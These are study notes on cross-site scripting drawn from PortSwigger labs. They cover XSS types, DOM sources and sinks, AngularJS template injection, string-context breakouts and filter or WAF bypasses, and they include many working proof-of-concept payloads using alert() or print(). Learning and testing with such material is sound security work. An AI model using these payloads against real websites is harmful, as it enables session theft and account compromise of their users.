# XSS Notes — PortSwigger

> **XSS (Cross-Site Scripting)** injects malicious JavaScript into a victim's browser via a vulnerable website.

---

## Types of XSS

### 1. Reflected XSS
- Payload comes from the **current HTTP request**
- The server reflects attacker-controlled input back in the response
- Victim must interact with an attacker-crafted link

**Example:**
```
https://insecure-website.com/status?message=All+is+well.
→ <p>Status: All is well.</p>
```

**Basic payload:**
```html
<script>alert(1)</script>
```

> **Self-XSS vs Reflected XSS:** Self-XSS can only be triggered by the victim themselves (requires social engineering). It is considered low-impact.

---

### 2. Stored XSS
- Payload is **stored in the database** and served to other users
- Common injection point: blog comments, user profiles, etc.

**Example:**
```html
<p><script>/* Bad stuff... */</script></p>
```

---

### 3. DOM-Based XSS
- Vulnerability exists in **client-side code**, not server-side
- Data flows from a **source** → **sink** unsafely

**Example payload:**
```html
<img src=1 onerror='/* Bad stuff here... */'>
```

> To find DOM-based vulns in non-URL inputs (e.g. `document.cookie`) or non-HTML sinks (`setTimeout`), JavaScript code review is required. Burp's scanner can automate this.

---

## Sources & Sinks (DOM XSS)

### Sources
Attacker-controllable JS properties:
- `location.search`
- `document.referrer`
- `document.cookie`
- Web messages

### Sinks
Dangerous JS functions/objects:
- `eval()` — executes argument as code
- `document.body.innerHTML` — allows injecting HTML/JS
- `document.write()`
- `setTimeout()`, `setInterval()`
- jQuery `attr()`

> **Rule:** DOM-based vulns arise when data passes from a source → sink unsafely.

---

## Testing for XSS

### General
- Use `alert()` — but since Chrome's 2021 security update, prefer `print()`
- Inject a unique alphanumeric string first, then check where it reflects in the DOM

### DOM XSS Checklist
When testing DOM XSS, always look for:
- [ ] `ng-app`
- [ ] `ng-controller`
- [ ] `{{ }}` (AngularJS expressions)
- [ ] `ng-bind`

---

## Exploiting DOM XSS

### Via `storeId` parameter
```
&storeId="></select><img%20src=1%20onerror=alert(1)>
```
(`%20` = space)

### Via `innerHTML` sink + `location.search` source
Inject payload directly in the search bar.

### Via jQuery `attr()` (href manipulation)
jQuery's `attr()` can change DOM element attributes — useful when href is a sink.

### Via iFrame + `location.hash`
```html
<iframe src="https://VULN-SITE/#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
- `src` = vulnerable site
- `#` = everything after is `location.hash`
- When hash changes, the payload runs
- `<img src=x onerror=print()>` — `x` is not a real image, so error triggers `print()`

---

## AngularJS Template Injection

In AngularJS, no `<script>` tags are needed — `{{ expression }}` is auto-executed.

```
{{alert(1)}}
```

### Bypassing filters with `$on.constructor`
```
{{$on.constructor('alert(1)')()}}
```
- `$on` is a built-in AngularJS event function
- `.constructor` points to the `Function` constructor
- `('alert(1)')` creates a function
- Final `()` immediately executes it

**Flow:**
```
User input → Inserted into HTML → AngularJS processes {{ }} → JavaScript executes
```

---

## Reflected DOM XSS

Two-step process (server is involved):
1. Server **echoes** attacker input into HTML (e.g., into a JS variable)
2. Browser processes that variable through a **sink** (e.g., `eval()`)

```js
eval('var data = "reflected string"');
```

### Lab: Breaking out of `eval()`
Server-side code:
```js
eval('var searchResultsObj = ' + this.responseText);
```

- Injecting `"` won't work — server escapes it as `\"`
- Send a backslash `\` yourself → server adds another `\` → JS sees `\\` = literal backslash → closes string early!

**Final payload:**
```
\"-alert(1)}//
```
Result in eval:
```js
{"searchTerm":"\" - alert(1)}//..."}
```

---

## XSS in JavaScript String Contexts

### Breaking out of quoted string literals
```
'-alert(document.domain)-'
';alert(document.domain)//
```

### When single quotes are backslash-escaped
```
\';alert(document.domain)//
```
- Your `\` neutralises the server's `\`, freeing the `'`

### When inside a JavaScript template literal
```
${alert(1)}
```
Works when the context looks like:
```js
var input = `controllable data here`;
```

### Terminating a script block entirely
```html
</script><script>alert(1)</script>
```
Works when inside a `<script>` block and quotes aren't escaped.

---

## Bypassing Filters & WAFs

### Using HTML entities (inside event attributes)
HTML decoding happens **before** JS interpretation:
```
&apos;-alert(document.domain)-&apos;
```
Used when inside an `onclick` attribute with single quotes escaped.

### Using `onerror` + `throw`
```js
onerror=alert;throw 1
```
Assigns `alert` as the global exception handler, then throws `1` to it.

### Bypassing angle bracket filters with attribute injection
```
" autofocus onfocus=alert(1) x="
```
- `x=` is a dummy attribute to prevent syntax confusion

### `javascript:` protocol in `href`
```
javascript:alert(document.domain)
```
Special protocol — instead of navigating, runs the code directly.

---

## XSS via SVG / Allowed Tags

When only certain HTML tags are allowed:

```
<svg><animatetransform onbegin=alert(1)>
```
Find `onbegin` and other valid events using Burp Intruder over the allowed tags/events list.

Then **percent-encode** the payload and insert it into the URL.

---

## Canonical Link Tag Injection

Vulnerable pattern:
```html
<link rel="canonical" href='USER_INPUT'>
```

Inject via URL query string:
```
?input='accesskey='x'onclick='alert(1)
```

Result:
```html
<body 'accesskey='x'onclick='alert(1)>
```

---

## Stored XSS → `onclick` with HTML-encoded angle brackets

Inside an `onclick` attribute where `<`, `>`, `"` are HTML-encoded and `'`, `\` are escaped:

```
http:&apos;-alert(document.domain)-&apos;
```

---

## Key Encoding Reference

| Encoded | Character |
|---------|-----------|
| `%20`   | Space     |
| `%3B`   | `;`       |
| `%27`   | `'`       |
| `%3F`   | `?`       |
| `%3D`   | `=`       |
| `%25`   | `%`       |
| `%3A`   | `:`       |
| `%3C`   | `<`       |
| `&apos;`| `'`       |

---

## Related Topics
- [[SQL Injection Notes]]
- [[WebSockets XSS]]
- [[Burp Suite — Intruder & Repeater]]
